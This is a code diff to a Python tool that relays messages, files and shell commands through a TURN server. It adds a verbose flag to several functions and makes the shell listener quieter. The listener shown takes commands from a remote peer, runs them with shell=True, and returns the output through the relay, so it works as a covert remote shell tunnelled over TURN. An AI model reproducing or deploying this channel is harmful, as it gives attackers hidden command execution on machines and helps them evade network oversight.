@@ -43,7 +43,7 @@ STUN_MESSAGE_TYPES = {
 # ------------------------------------
 # Quick Message Client
 # ------------------------------------
-def start_quick_message_client(turn_server, turn_port):
+def start_quick_message_client(turn_server, turn_port, verbose):
     TURN_SERVER = (turn_server, int(turn_port))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(None)  # No timeout
@@ -106,7 +106,7 @@ def start_quick_message_client(turn_server, turn_port):
 # ----------------------
 # Quick Message Listener
 # ----------------------
-def start_message_listener(turn_server, turn_port):
+def start_message_listener(turn_server, turn_port, verbose):
     TURN_SERVER = (turn_server, int(turn_port))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(None)  # No timeout
@@ -168,7 +168,7 @@ def start_message_listener(turn_server, turn_port):
 # -------------------
 # Sending File Client
 # -------------------
-def start_send_file_client(turn_server, turn_port):
+def start_send_file_client(turn_server, turn_port, verbose):
     TURN_SERVER = (turn_server, int(turn_port))
     # Create and configure socket
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -219,7 +219,7 @@ def start_send_file_client(turn_server, turn_port):
 # ------------------
 # Send File Listener
 # ------------------
-def start_file_listener(turn_server, turn_port):
+def start_file_listener(turn_server, turn_port, verbose):
     TURN_SERVER = (turn_server, int(turn_port))
     # Create and configure socket
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -337,6 +337,7 @@ def start_shell_listener(turn_server, turn_port, verbose):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
     sock.settimeout(None)
     sock.setblocking(False)
+    
     # Generate a random valid channel number (RFC 5766: between 0x4000 - 0x7FFF)
     # HARDCODED VALUE
     channel_number = 0x4001
@@ -359,26 +360,6 @@ def start_shell_listener(turn_server, turn_port, verbose):
         if sock in ready:
             try:
                 response, addr = sock.recvfrom(4096)
-                print(f"Received response from {addr} at {time.strftime('%H:%M:%S')}")
-
-                if response:
-                    print(f"Response (hex): {response.hex()}")
-                    command = _parse_command_response(response, verbose)
-
-                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                    output = result.stdout if result.stdout else result.stderr
-                    output = output.strip() if output else "EXECUTION WITH NO OUTPUT..."
-
-                    # Send output back
-                    send_data_packet = packetBuilder.build_channelData(channel_number, output)
-                    sock.sendto(send_data_packet, TURN_SERVER)
-                    print("Sent command output back to client.")
-            except Exception as e:
-                print(f"Socket error: {e}")
-
-        if sock in ready:
-            try:
-                response, addr = sock.recvfrom(4096)
                 print(f"Received command from {addr} at {time.strftime('%H:%M:%S')}")
 
                 command = response.strip()
@@ -389,7 +370,9 @@ def start_shell_listener(turn_server, turn_port, verbose):
                 # Send output back
                 send_data_packet = packetBuilder.build_channelData(channel_number, output)
                 sock.sendto(send_data_packet, TURN_SERVER)
-                print("Sent command output back to client.")
+                
+                if verbose:
+                    print("Sent command output back to client.")
             except Exception as e:
                 pass
 
@@ -404,9 +387,11 @@ def start_shell_listener(turn_server, turn_port, verbose):
             refresh_packet = packetBuilder.build_refresh()
             sock.sendto(refresh_packet, TURN_SERVER)
             channel_bind_packet = packetBuilder.build_channelBind(RTA_TUP[0], RTA_TUP[1], channel_number)
-            print(f"Sending Channel Bind Request (Channel {channel_number})...")
+            if verbose:
+                print(f"Sending Channel Bind Request (Channel {channel_number})...")
             sock.sendto(channel_bind_packet, TURN_SERVER)
-            print(f"Sent Refresh packet at {time.strftime('%H:%M:%S')}")
+            if verbose:
+                print(f"Sent Refresh packet at {time.strftime('%H:%M:%S')}")
             last_refresh_time = time.time()
 
 # ------------------------------------
